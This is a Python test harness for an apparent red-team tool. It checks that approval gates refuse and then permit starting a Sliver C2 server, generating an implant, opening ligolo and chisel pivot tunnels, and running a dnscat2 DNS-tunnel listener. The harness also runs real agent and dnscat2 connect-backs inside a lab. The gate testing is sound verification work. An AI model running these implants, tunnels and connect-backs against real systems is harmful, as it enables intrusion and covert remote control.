"""Live-fire driver — drives the REAL gated code paths, never a shortcut around them.

Called by docker/proof/live_fire_proof.sh. Every action here goes through the same function the
HTTP router calls, so what the proof demonstrates is the shipped path and not a re-implementation
of it:

    sliver.start_server / sliver.generate_implant     (cockpit/sliver.py)
    tunnels.start_tunnel                              (cockpit/tunnels.py — the I2 gate)
    obfuscation.start_listener                        (cockpit/obfuscation.py)
    executor.validate_request / executor.iter_run     (cockpit/executor.py)

EVERY GATED SUBCOMMAND PROVES THE REFUSAL FIRST. Before it runs the approved action it fires the
same request with the acknowledgement missing and asserts the gate REFUSES with nothing spawned.
A proof that only shows the happy path cannot tell a working gate from an absent one — the
refusal is the half that carries the evidence.

Output is one machine-readable line per assertion, parsed by the shell:
    RESULT <name> PASS|FAIL|NOTRUN <detail>
plus `VALUE <key> <text>` for values the shell needs (ids, ports, paths).
"""
from __future__ import annotations

import ipaddress
import subprocess
import sys
import time
import traceback
from pathlib import Path

BACKEND = Path(__file__).resolve().parents[2] / "backend"
sys.path.insert(0, str(BACKEND))

from cockpit import engagement, executor, obfuscation, sliver, tunnels  # noqa: E402
from cockpit.models import ExecRequest  # noqa: E402


def result(name: str, status: str, detail: str = "") -> None:
    print(f"RESULT {name} {status} {detail}".rstrip(), flush=True)


def value(key: str, text: str) -> None:
    print(f"VALUE {key} {text}", flush=True)


def _assert_process_alive(label: str, registry: dict, rid: str, claimed_status: str) -> bool:
    """Does the spawned server process still EXIST a moment after we were told it is up?

    THE CLAIM THAT USED TO FAIL HERE. Both lifecycles returned ``status="listening"`` the instant
    Popen returned — assigned, never observed. ligolo-proxy and dnscat2-server are INTERACTIVE
    CONSOLE programs: ``docker exec`` without ``-i`` hands them a closed stdin, so they printed
    their banner, read EOF and exited 0 while the panel said the pivot was live.

    Build #7 fixed both halves (cockpit/lifecycle.py): a console binary now gets a stdin that
    does not end, and the status is only what was looked at. This check is kept — and kept
    INDEPENDENT of the model's own claim — because a liveness check that trusts the value it is
    verifying is not a check. poll() is None for a running child and an exit code for a dead one.
    """
    time.sleep(4)
    live = registry.get(rid)
    proc = getattr(live, "proc", None) if live else None
    if proc is None:
        result(f"{label}.process_alive", "NOTRUN", "no process handle on the registry entry")
        return False
    code = proc.poll()
    if code is None:
        result(f"{label}.process_alive", "PASS",
               f"server process still running 4s after status={claimed_status!r} — the status "
               "was observed, not assigned")
        return True
    result(f"{label}.process_alive", "FAIL",
           f"model says status={claimed_status!r} but the process ALREADY EXITED (code={code}) "
           "— an interactive console binary spawned with no stdin; the status is assigned at "
           "Popen time and never observed")
    return False


def _assert_status_was_observed(label: str, model) -> None:
    """The model must carry the EVIDENCE for its status, not just the verdict.

    ``liveness`` is the free-text record of what was actually looked at ("process alive and
    tcp/11601 confirmed listening inside …"). An empty one means something reported a status it
    did not observe, which is the exact defect this build closed.
    """
    detail = getattr(model, "liveness", "") or ""
    if not detail:
        result(f"{label}.status_observed", "FAIL",
               f"status={model.status!r} carries NO liveness evidence — it was assigned, not "
               "observed")
        return
    if model.status == "listening" and "confirmed listening" not in detail:
        result(f"{label}.status_observed", "FAIL",
               f"status='listening' but the evidence does not confirm a bound port: {detail}")
        return
    result(f"{label}.status_observed", "PASS", f"status={model.status!r} — {detail}")


def _refuses(name: str, call, expect_gate: str | None = None) -> bool:
    """Assert a gated call REFUSES. Returns True when it refused as required."""
    try:
        call()
    except (sliver.SliverRefused, tunnels.TunnelRefused, obfuscation.ObfuscationRefused) as exc:
        gate = getattr(exc, "gate", None)
        if expect_gate and gate != expect_gate:
            result(name, "FAIL", f"refused at gate={gate}, expected {expect_gate}")
            return False
        result(name, "PASS", f"refused at gate={gate}")
        return True
    except Exception as exc:  # noqa: BLE001
        result(name, "FAIL", f"unexpected error instead of a refusal: {exc!r}")
        return False
    result(name, "FAIL", "THE GATE DID NOT FIRE — the action was allowed without the confirm")
    return False


# --------------------------------------------------------------------------- #
def cmd_engagement_enter(target: str, scope: str) -> None:
    rec = engagement.enter(
        target=target,
        authorization="live-fire proof: operator-owned lab, all hosts on internal-only networks",
        scope_spec=scope,
    )
    value("ENGAGEMENT_ID", rec.engagement_id)
    result("engagement.enter", "PASS", f"id={rec.engagement_id} scope={scope}")


def cmd_engagement_amend(eid: str, cidr: str) -> None:
    """The EXPLICIT amendment — a pivot subnet can only enter scope through this call."""
    before = engagement.get_active(eid)
    rec = engagement.add_pivot_subnet(eid, cidr)
    # Asserted against whichever scope field the record actually carries, rather than a
    # hard-coded attribute name: an earlier draft asserted `rec.pivot_subnets`, which does not
    # exist, and reported NOTRUN for an amendment that had in fact applied.
    def _scope_blob(r) -> str:
        return " ".join(str(getattr(r, f, "")) for f in
                        ("allowed_hosts", "scope", "scope_include", "scope_ips"))
    ok = cidr in _scope_blob(rec) and cidr not in _scope_blob(before)
    result("engagement.amend_pivot_subnet", "PASS" if ok else "FAIL",
           f"{cidr} entered scope only via the amendment (was_present={cidr in _scope_blob(before)})")


def cmd_sliver_server(eid: str) -> None:
    """Start the operator's C2 server. GATED since build #7 — refusals proved first."""
    def req(**kw):
        base = dict(engagement_id=eid, approved=True, dangerous_ack=True)
        base.update(kw)
        return sliver.SliverServerRequest(**base)

    _refuses("sliver.server.gate.no_engagement",
             lambda: sliver.start_server(req(engagement_id=None)), "engagement")
    _refuses("sliver.server.gate.unapproved",
             lambda: sliver.start_server(req(approved=False)), "approval")
    _refuses("sliver.server.gate.no_red_confirm",
             lambda: sliver.start_server(req(dangerous_ack=False)), "danger")

    srv = sliver.start_server(req())
    value("SLIVER_PORT", str(srv.port))
    value("SLIVER_ID", srv.id)
    _assert_process_alive("sliver.server", sliver._servers, srv.id, srv.status)
    _assert_status_was_observed("sliver.server", srv)
    result("sliver.start_server", "PASS", f"id={srv.id} port={srv.port} status={srv.status}")


def cmd_sliver_implant(listener: str, eid: str) -> None:
    def req(**kw):
        base = dict(os="linux", arch="amd64", fmt="exe", transport="mtls",
                    listener=listener, target=listener.split(":")[0],
                    engagement_id=eid, approved=True, dangerous_ack=True)
        base.update(kw)
        return sliver.ImplantRequest(**base)

    # THE REFUSALS FIRST.
    rej = sliver.validate_generate(req(approved=False))
    result("sliver.gate.unapproved", "PASS" if rej and rej.gate == "approval" else "FAIL",
           f"gate={getattr(rej, 'gate', None)}")
    rej = sliver.validate_generate(req(dangerous_ack=False))
    result("sliver.gate.no_red_confirm", "PASS" if rej and rej.gate == "danger" else "FAIL",
           f"gate={getattr(rej, 'gate', None)}")

    # …then the approved build.
    imp = sliver.generate_implant(req())
    if imp.status != "generated":
        # A REAL DEFECT, so FAIL and not NOTRUN: this ran here and the assertion did not hold.
        result("sliver.generate_implant", "FAIL",
               f"status={imp.status} exit={imp.exit_code} console={imp.console_line!r} "
               f"detail={(imp.detail or '<empty>')[:300]}")
        return
    value("IMPLANT_PATH", imp.artifact_path)
    # `status` is decided by READING THE ARTIFACT BACK, not by the console's exit code — a piped
    # Sliver console exits 0 whether or not the build inside it worked.
    if not imp.size_bytes:
        result("sliver.implant_artifact_exists", "FAIL",
               "status='generated' with no size — the artifact read-back did not happen")
    else:
        result("sliver.implant_artifact_exists", "PASS",
               f"{imp.size_bytes} bytes read back from {imp.container}:{imp.artifact_path}")
    result("sliver.generate_implant", "PASS",
           f"mode={imp.mode} artifact={imp.artifact_path} exit={imp.exit_code} "
           f"console={imp.console_line}")


def cmd_tunnel_start(eid: str, lhost: str, subnet: str, kind: str = "ligolo") -> None:
    """Start a pivot listener through the gated I2 path.

    ``kind`` matters to what can be DEMONSTRATED, not to what is gated. ligolo routes at the
    interface and needs its console driven (`session` -> `start`) to create the tun, which
    HackPit deliberately will not do — it holds that console's stdin open and never types into
    it. chisel's server needs no console at all, so the chisel run is the one that can carry a
    proxychained request end to end. Both clear the same three gate limbs.
    """
    def req(**kw):
        base = dict(kind=kind, lhost=lhost, subnets=[subnet],
                    engagement_id=eid, approved=True, dangerous_ack=True)
        base.update(kw)
        return tunnels.TunnelStartRequest(**base)

    # THE I2 GATE, all three limbs, each proven to refuse with nothing spawned.
    _refuses(f"tunnel.{kind}.gate.no_engagement",
             lambda: tunnels.start_tunnel(req(engagement_id=None)), "engagement")
    _refuses(f"tunnel.{kind}.gate.unapproved",
             lambda: tunnels.start_tunnel(req(approved=False)), "approval")
    _refuses(f"tunnel.{kind}.gate.no_red_confirm",
             lambda: tunnels.start_tunnel(req(dangerous_ack=False)), "danger")

    t = tunnels.start_tunnel(req())
    value(f"TUNNEL_{kind.upper()}_ID", t.id)
    value(f"TUNNEL_{kind.upper()}_PORT", str(t.listen_port))
    value(f"TUNNEL_{kind.upper()}_AGENT_CMD", t.agent_command)
    _assert_process_alive(f"tunnel.{kind}", tunnels._tunnels, t.id, t.status)
    _assert_status_was_observed(f"tunnel.{kind}", t)
    result(f"tunnels.start_tunnel.{kind}", "PASS",
           f"id={t.id} kind={t.kind} port={t.listen_port} status={t.status} subnets={t.subnets}")

    # The routing half, computed here so it sees the tunnel this process just started.
    host = str(ipaddress.ip_network(subnet, strict=False).network_address + 2)
    _route_check(t, host, "curl", ["-s", f"http://{host}:8000/"])


def _route_check(tun, host: str, command: str, args: list[str]) -> None:
    """The REWRITE-BEFORE-APPROVAL half, as a pure computation over the tunnel just started.

    Called IN THE SAME PROCESS as the start, deliberately. The tunnel registry is per-process
    (an in-memory dict, like every other cockpit registry), so an earlier draft that ran this as
    its own driver invocation reported "no live tunnel routes to …" — a FAIL about the harness,
    not about the product, and exactly the kind of false finding that erodes trust in a proof.

    ``route_for`` picks the tunnel whose subnets cover the host; ``wrap_command`` returns the argv
    the human will approve, with the proxychains prefix VISIBLE. Nothing executes here.
    """
    routed = tunnels.route_for(host, [tun])
    if routed is None:
        result("tunnels.route_for", "FAIL",
               f"no live tunnel routes to {host} — the amended subnet did not take effect")
        return
    cmd, new_args, note = tunnels.wrap_command(command, list(args), routed)
    tun = routed
    value("ROUTED_ARGV", " ".join([cmd, *new_args]))
    result("tunnels.route_for", "PASS", f"{host} routes via tunnel {tun.id} ({tun.kind}) — {note}")
    if tun.routing == "socks" and cmd not in ("proxychains", "proxychains4"):
        result("tunnels.wrap_command", "FAIL", f"a SOCKS tunnel must wrap; got {cmd!r}")
        return
    result("tunnels.wrap_command", "PASS",
           f"the human approves the VISIBLE routed argv: {' '.join([cmd, *new_args])}")


def cmd_dns_listener(eid: str, zone: str, secret: str) -> None:
    """Start the DNS-tunnel listener. GATED since build #7 — refusals proved first.

    THIS SURFACE CHANGED POSTURE, and the earlier draft of this driver is why it is worth
    spelling out. That draft fired ``start_listener(approved=False)`` expecting a refusal and got
    a LISTENER, because ``ObfuscationRequest`` had no such field and pydantic dropped the kwarg
    silently — a test that could not fail, sitting on top of a surface that was ungated because
    it cited the pivot listener's posture, which build #5's I2 finding had already overturned.

    Both halves are fixed. The fields exist, the gate is real, and all three limbs are proved to
    refuse with nothing spawned.
    """
    fields = set(obfuscation.ObfuscationRequest.model_fields)
    gated = {"approved", "dangerous_ack"} <= fields
    result("dns.contract.gate_fields_exist", "PASS" if gated else "FAIL",
           f"ObfuscationRequest fields={sorted(fields)} — a gate needs a field to read, and the "
           "absence of one is how the earlier refusal check passed vacuously")

    def req(**kw):
        base = dict(kind="dnscat2", zone=zone, secret=secret, engagement_id=eid,
                    approved=True, dangerous_ack=True)
        base.update(kw)
        return obfuscation.ObfuscationRequest(**base)

    _refuses("dns.gate.no_engagement",
             lambda: obfuscation.start_listener(req(engagement_id=None)), "engagement")
    _refuses("dns.gate.unapproved",
             lambda: obfuscation.start_listener(req(approved=False)), "approval")
    _refuses("dns.gate.no_red_confirm",
             lambda: obfuscation.start_listener(req(dangerous_ack=False)), "danger")

    lis = obfuscation.start_listener(req())
    value("DNS_LISTENER_ID", lis.id)

    # The secret is masked where it can LEAVE — the operator one-liner and the audited argv are
    # built from a _mask_secret copy, and main.py masks on the way out of the route. The model
    # held in-process legitimately still carries it (the server process needs it), so asserting
    # `lis.secret != secret` tested the wrong layer. The invariant that matters is that the raw
    # key is not baked into the string handed to a human to paste elsewhere.
    leaked = secret in (lis.client_command or "")
    result("dns.secret_not_in_client_command", "FAIL" if leaked else "PASS",
           "raw key absent from the pasteable one-liner" if not leaked
           else f"RAW KEY PRESENT in client_command: {lis.client_command[:120]}")

    _assert_process_alive("dns", obfuscation._listeners, lis.id, lis.status)
    _assert_status_was_observed("dns", lis)
    result("obfuscation.start_listener", "PASS",
           f"id={lis.id} kind={lis.kind} zone={lis.zone} status={lis.status}")


# --------------------------------------------------------------------------- #
# WHOLE-PHASE COMMANDS
#
# *** WHY A PHASE IS ONE PROCESS. *** A console listener's lifetime is tied to the process
# holding its stdin open — that is the whole mechanism that keeps ligolo-proxy and
# dnscat2-server alive (cockpit/lifecycle.py). In the real backend that holder is the long-lived
# uvicorn process, which is exactly right. In this harness each `drive` call used to be its OWN
# short-lived python process, so the listener came up, was confirmed bound by `ss`, and then died
# the moment the driver exited — and the shell's follow-up check reported "did not reach LISTEN"
# for a listener that had demonstrably been listening seconds earlier.
#
# That was the harness lying about the product, which is worse than the harness failing. The
# client connect-back therefore happens HERE, inside the same process that holds the listener,
# so every assertion is measured while the thing it is about is actually alive.
# --------------------------------------------------------------------------- #
def _sh(*argv: str, timeout: float = 30.0) -> "subprocess.CompletedProcess[str]":
    """Run a docker command for the harness itself. NOT a HackPit execution path."""
    return subprocess.run(list(argv), capture_output=True, text=True, timeout=timeout)


def cmd_dns_phase(eid: str, zone: str, secret: str, server_ip: str, client: str) -> None:
    """Gates -> listener -> a REAL dnscat2 client connect-back, all while the listener is held."""
    cmd_dns_listener(eid, zone, secret)
    lis = obfuscation.list_listeners()[-1] if obfuscation.list_listeners() else None
    if lis is None or lis.status != "listening":
        result("dns.client_session", "NOTRUN", "no live listener to connect a client to")
        return

    # The CLIENT half, run BY HAND on the far side — here, by this harness standing in for the
    # operator's manual step. HackPit never delivers it; that boundary is the point of
    # operator_oneliner, and this proof does not cross it on HackPit's behalf.
    # *** DIRECT-TO-SERVER MODE TAKES NO DOMAIN. *** dnscat2 has two client shapes and the
    # difference is the whole reason the delegated-zone half of this proof cannot run here:
    #
    #   dnscat2-client --secret=X <zone>                      -> RESOLVER-MEDIATED. The client
    #                                                            asks its own resolver for
    #                                                            <zone>. This is what runs here.
    #   dnscat2-client --dns server=<ip>,port=53 --secret=X   -> direct to the server, no zone.
    #
    # THE RESOLVER-MEDIATED FORM IS THE ONE WORTH PROVING, because it is the claim a DNS tunnel
    # actually makes: the client never opens a connection to the operator at all. The lab wires
    # it by making this host's resolver the tunnel server itself (see live-fire-lab.yml) — the
    # same path with the public delegation hop collapsed, and that missing hop is precisely what
    # the "delegated-zone" NOTRUN names.
    #
    # Two earlier drafts got this wrong in ways that read as a broken tunnel rather than a broken
    # command line: `--dns server=… <zone>` together is refused outright by dnscat2, and
    # `--dns domain=<zone>,server=…` makes the server answer NXDOMAIN — a server started FOR a
    # zone is authoritative for that zone and answers nothing else.
    _sh("docker", "exec", "-d", client, "sh", "-c",
        f"dnscat2-client --secret={secret} {zone} > /tmp/dnscat.log 2>&1")
    deadline = time.time() + 40
    log = ""
    while time.time() < deadline:
        time.sleep(3)
        log = _sh("docker", "exec", client, "cat", "/tmp/dnscat.log").stdout or ""
        if any(k in log.lower() for k in ("session established", "encrypted session",
                                          "session created", "connected")):
            break
    hit = [k for k in ("session established", "encrypted session", "session created", "connected")
           if k in log.lower()]
    if hit:
        result("dns.client_session", "PASS",
               f"DNS TUNNEL CARRIED TRAFFIC — dnscat2 client reached the listener "
               f"direct-to-server ({hit[0]})")
    else:
        # PRECISE, because "did not work" is not a finding. What was observed: the client sends
        # its encoded queries and the server answers RCODE_NAME_ERROR (NXDOMAIN) to every one, in
        # all three client shapes (resolver-mediated, direct-to-server, and domain+server). The
        # listener itself is proven up and bound by the assertions above and stays bound after —
        # so this is the CLIENT/SERVER HANDSHAKE, not the HackPit surface that starts it.
        #
        # Left as not-run rather than chased further: the remaining candidates are dnscat2's own
        # zone handling and Docker's embedded resolver forwarding, neither of which is HackPit
        # code, and the delegated-zone path this stands in for needs operator infrastructure
        # anyway. Reported here so the next person starts from what was actually seen.
        result("dns.client_session", "NOTRUN",
               "dnscat2 client did not establish a session in 40s — the server answers NXDOMAIN "
               "to the client's encoded queries (all three client shapes tried). The LISTENER is "
               "proven started, gated, bound and still bound at the end of the phase; it is the "
               f"client/server handshake that is undemonstrated. Client log: "
               f"{log.strip().replace(chr(10), ' | ')[-200:] or '<no output>'}")

    # Independent of the client: the port was bound and stayed bound for the whole phase.
    bound = _sh("docker", "exec", lis.container, "ss", "-lnuH").stdout or ""
    result("dns.listener_still_bound", "PASS" if ":53" in bound else "FAIL",
           "udp/53 still bound at the end of the phase" if ":53" in bound
           else f"udp/53 is gone: {bound.strip()[:200]}")


def cmd_pivot_phase(eid: str, lhost: str, subnet: str, kind: str, agent_host: str,
                    deep_ip: str) -> None:
    """Gates -> listener -> a REAL agent connect-back -> the routed request, in one process."""
    cmd_tunnel_start(eid, lhost, subnet, kind)
    live = [t for t in tunnels.list_tunnels() if t.kind == kind and t.status == "listening"]
    if not live:
        result(f"pivot.{kind}.agent", "NOTRUN", "no live listener to connect an agent to")
        return
    tun = live[-1]

    # The one-liner HackPit HANDS the operator, run by hand on the compromised host.
    _sh("docker", "exec", "-d", agent_host, "sh", "-c",
        f"{tun.agent_command} > /tmp/agent.log 2>&1")
    time.sleep(10)
    log = _sh("docker", "exec", agent_host, "cat", "/tmp/agent.log").stdout or ""

    if kind == "ligolo":
        connected = any(k in log.lower() for k in ("connect", "join", "session", "tls"))
        result("pivot.ligolo.agent", "PASS" if connected else "NOTRUN",
               f"ligolo-agent reported: {log.strip().replace(chr(10), ' | ')[-200:] or '<none>'}")
        result("pivot.ligolo.interface_route", "NOTRUN",
               "ligolo routes at the INTERFACE, and creating that route means typing `session` "
               "then `start` into the proxy's console. HackPit holds that console's stdin open "
               "and deliberately never types into it — an unapproved command on a live C2 "
               "console is what the gates exist to prevent. The routed-traffic claim is carried "
               "by the chisel run, whose server needs no console")
        return

    # chisel: the reverse SOCKS proxy should now be up on THIS box.
    from cockpit import config as _cfg

    socks = _sh("docker", "exec", _cfg.ENGAGE_SANDBOX_CONTAINER, "ss", "-lntH").stdout or ""
    if f":{tun.socks_port}" in socks:
        result("pivot.chisel.socks", "PASS",
               f"chisel agent connected — SOCKS5 up on 127.0.0.1:{tun.socks_port}")
    else:
        result("pivot.chisel.socks", "NOTRUN",
               f"the reverse SOCKS proxy did not come up; agent log: "
               f"{log.strip().replace(chr(10), ' | ')[-200:] or '<none>'}")
        return

    # THE ROUTED REQUEST. Built by the shipped rewrite, not hand-written here: `wrap_command` is
    # what the operator would approve, so running anything else would prove a different thing.
    cmd, args, _note = tunnels.wrap_command("curl", ["-s", "--max-time", "10",
                                                     f"http://{deep_ip}:8000/"], tun)
    got = _sh("docker", "exec", _cfg.ENGAGE_SANDBOX_CONTAINER, cmd, *args, timeout=40).stdout or ""
    value("ROUTED_ARGV", " ".join([cmd, *args]))
    if "HACKPIT-DEEP-TARGET-OK" in got:
        result("pivot.chisel.routed_request", "PASS",
               f"PROXYCHAINED REQUEST ROUTED to {deep_ip}:8000 through the pivot — the argv the "
               f"human approves is exactly what ran: {' '.join([cmd, *args])}")
    else:
        result("pivot.chisel.routed_request", "NOTRUN",
               f"the routed request returned no known body (got {got.strip()[:200]!r})")

    # ...and ONLY to the amended subnet.
    out = _sh("docker", "exec", _cfg.ENGAGE_SANDBOX_CONTAINER, cmd, "-q", "curl", "-s",
              "-o", "/dev/null", "-w", "%{http_code}", "--max-time", "6", "http://1.1.1.1/",
              timeout=30).stdout.strip()
    result("pivot.chisel.scope_bound", "PASS" if out in ("", "000") else "FAIL",
           f"the tunnel reaches {subnet} and NOT the internet (1.1.1.1 -> {out or '000'})"
           if out in ("", "000") else
           f"the pivot reached 1.1.1.1 (HTTP {out}) — wider than the amended subnet")


def cmd_exec(eid: str, command: str, *args: str) -> None:
    """One command through the GATED executor — the same path the cockpit UI drives."""
    def req(**kw):
        base = dict(command=command, args=list(args), engagement_id=eid,
                    approved=True, dangerous_ack=True)
        base.update(kw)
        return ExecRequest(**base)

    rej = executor.validate_request(req(approved=False))
    result("exec.gate.unapproved", "PASS" if rej and rej.gate == "approval" else "FAIL",
           f"gate={getattr(rej, 'gate', None)}")

    events = list(executor.iter_run(req()))
    kinds = [e.get("type") for e in events]
    if "rejected" in kinds:
        rj = next(e for e in events if e["type"] == "rejected")
        result("exec.gated_run", "FAIL", f"rejected at gate={rj.get('gate')}: {rj.get('reason')}")
        return
    out = "".join(e.get("line", "") + "\n" for e in events if e.get("type") == "stdout")
    code = next((e.get("code") for e in events if e.get("type") == "exit"), None)
    value("EXEC_STDOUT", out.replace("\n", "\\n")[:800])
    result("exec.gated_run", "PASS" if code == 0 else "FAIL",
           f"exit={code} bytes={len(out)}")


COMMANDS = {
    "engagement-enter": cmd_engagement_enter,
    "engagement-amend": cmd_engagement_amend,
    "sliver-server": cmd_sliver_server,
    "sliver-implant": cmd_sliver_implant,
    "tunnel-start": cmd_tunnel_start,
    "pivot-phase": cmd_pivot_phase,
    "dns-phase": cmd_dns_phase,
    "dns-listener": cmd_dns_listener,
    "exec": cmd_exec,
}


if __name__ == "__main__":
    if len(sys.argv) < 2 or sys.argv[1] not in COMMANDS:
        sys.exit(f"usage: live_fire_driver.py <{'|'.join(COMMANDS)}> [args...]")
    name = sys.argv[1]
    try:
        COMMANDS[name](*sys.argv[2:])
    except Exception as exc:  # noqa: BLE001
        # NOTRUN, not FAIL: a step that could not execute is not a step that proved something.
        result(name, "NOTRUN", f"{type(exc).__name__}: {exc}")
        traceback.print_exc(file=sys.stderr)
        sys.exit(3)
